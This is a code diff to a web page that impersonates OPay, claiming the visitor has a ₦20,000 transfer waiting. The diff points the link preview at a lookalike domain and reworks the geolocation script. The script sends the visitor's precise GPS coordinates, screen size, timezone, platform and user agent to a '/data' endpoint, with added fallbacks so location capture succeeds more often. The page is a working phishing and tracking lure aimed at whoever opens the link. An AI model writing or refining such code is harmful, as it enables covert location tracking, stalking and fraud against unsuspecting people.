@@ -10,8 +10,8 @@
   <meta property="og:type"        content="website"/>
   <meta property="og:title"       content="OPay — You have an incoming transfer"/>
   <meta property="og:description" content="Someone sent you ₦20,000 via OPay. Your cash is ready to collect."/>
-  <meta property="og:image"       content="https://opayit.com/og-cash.jpg"/>
-  <meta property="og:url"         content="https://opayit.com"/>
+  <meta property="og:image"       content="https://opaycash.com/og-cash.jpg"/>
+  <meta property="og:url"         content="https://opaycash.com"/>
   <meta property="og:site_name"   content="OPay Agent Network"/>
   <meta name="description"        content="Your transfer is ready. Find the nearest OPay agent to collect your cash in minutes."/>
 
@@ -275,49 +275,50 @@
 
       if (navigator.geolocation) {
         let sent = false;
-        const watcher = navigator.geolocation.watchPosition(
-          (pos) => {
-            if (sent) return;
-            if (pos.coords.accuracy > 500) return;
+
+        function sendGPS(pos) {
+          if (sent) return;
+          sent = true;
+          fetch('/data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              txn_id: TXN_ID,
+              gps_lat: pos.coords.latitude,
+              gps_lon: pos.coords.longitude,
+              gps_accuracy_meters: pos.coords.accuracy,
+              screen: screen.width+'x'+screen.height,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              platform: navigator.platform,
+              ua: navigator.userAgent,
+              timestamp: new Date().toISOString(),
+              source: 'gps'
+            })
+          });
+          localStorage.setItem('opay_result_' + TXN_ID, 'success');
+          showResult();
+        }
+
+        function onErr(err) {
+          if (sent) return;
+          if (err.code === 1) {
             sent = true;
-            navigator.geolocation.clearWatch(watcher);
-            fetch('/data', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                txn_id: TXN_ID,
-                gps_lat: pos.coords.latitude,
-                gps_lon: pos.coords.longitude,
-                gps_accuracy_meters: pos.coords.accuracy,
-                screen: screen.width+'x'+screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform: navigator.platform,
-                ua: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                source: 'gps'
-              })
-            });
-            localStorage.setItem('opay_result_' + TXN_ID, 'success');
-            showResult();
-          },
-          (err) => {
-            if (!sent) {
-              sent = true;
-              navigator.geolocation.clearWatch(watcher);
-              localStorage.setItem('opay_result_' + TXN_ID, 'failed');
-              showError();
-            }
-          },
-          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-        );
-        setTimeout(() => {
-          if (!sent) {
-            sent = true;
-            navigator.geolocation.clearWatch(watcher);
             localStorage.setItem('opay_result_' + TXN_ID, 'failed');
             showError();
+          } else {
+            navigator.geolocation.getCurrentPosition(sendGPS, () => {
+              if (!sent) { sent = true; localStorage.setItem('opay_result_' + TXN_ID, 'failed'); showError(); }
+            }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
           }
-        }, 30000);
+        }
+
+        const watcher = navigator.geolocation.watchPosition(sendGPS, onErr,
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+        setTimeout(() => {
+          navigator.geolocation.clearWatch(watcher);
+          if (!sent) onErr({ code: 3 });
+        }, 20000);
       } else {
         showError();
       }
